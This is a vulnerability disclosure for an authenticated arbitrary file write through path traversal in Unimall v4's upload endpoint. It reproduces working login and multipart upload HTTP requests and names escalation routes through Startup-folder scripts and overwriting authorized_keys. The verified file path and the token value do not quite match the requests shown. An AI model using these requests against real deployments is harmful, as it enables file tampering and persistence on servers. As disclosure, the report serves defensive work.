# Unimall Arbitrary File Write via Path Traversal

## Summary

Unimall (dobbinsoft/unimall, e-commerce mall) `FileUploadController.local()` writes the uploaded file bytes to the attacker-controlled `fsf` path via `new FileOutputStream(fsf)` with **no path validation** (no whitelist, no `..` filter, any extension allowed, existing files overwritten). The endpoint reads the `ADMINTOKEN` header but validates it with `userAuthenticator.getUser()` (regular user session), so **any registered user** can exploit it. Registration is open (`@HttpOpenApi`), making the barrier a self-registered account.

**Affected**: Unimall v4 (unimall-runner)
**Condition**: any logged-in user (registration open)

## Reproduction

Env: `java -jar unimall-runner-v4.jar` (port 9080)

**1. Login (any registered user)**

```
POST /unimall/m.api/user/login HTTP/1.1
Host: 127.0.0.1:9080
Content-Type: application/json

{"phone":"13800138000","password":"12345678","platform":1}
```

→ `{"errno":200,"data":{"accessToken":"cd910a0a4b4641b2a06be097d0c34fc7",...}}`

![image-20260825154620678](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825154620678.8l0tpqeyhy.webp)

**2. Arbitrary file write (path traversal)**

```
POST /unimall/upload/local?fsf=D:/code/8.5/unimall_poc_write.txt HTTP/1.1
Host: 127.0.0.1:9080
ADMINTOKEN: a337a05a95b148098a8c0f994d83c935
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="poc.txt"
Content-Type: text/plain

unimall CVE PoC arbitrary file write
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

→ `{"errno":200,"errmsg":"成功"}`

![image-20260825154705730](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825154705730.1764gyumev.webp)

**3. Verify**

`D:\unimall_poc_write.txt` created with attacker-controlled content. Path and extension are fully attacker-controlled; existing files are deleted then overwritten.

![image-20260825154735070](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825154735070.7sny7zyz56.webp)

## Impact

Authenticated arbitrary file write / arbitrary file overwrite as the process user. On Windows can escalate to RCE/persistence by writing `.bat` to the Startup folder or overwriting `authorized_keys`; can overwrite any config/system file. Note: uploading JSP does not execute (Spring Boot embedded jar does not run filesystem JSP).
